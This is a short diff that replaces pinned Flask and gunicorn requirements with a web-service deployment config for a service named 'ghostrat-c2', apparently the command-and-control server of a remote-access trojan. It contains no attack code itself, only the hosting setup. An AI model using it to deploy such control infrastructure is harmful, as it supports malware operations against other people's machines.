@@ -1,2 +1,11 @@
-flask==3.0.0
-gunicorn==21.2.0
+services:
+  - type: web
+    name: ghostrat-c2
+    env: python
+    buildCommand: pip install -r requirements.txt
+    startCommand: gunicorn server:app --bind 0.0.0.0:$PORT --workers 2 --timeout 120
+    envVars:
+      - key: PYTHON_VERSION
+        value: 3.11.0
+      - key: ADMIN_TOKEN
+        generateValue: true
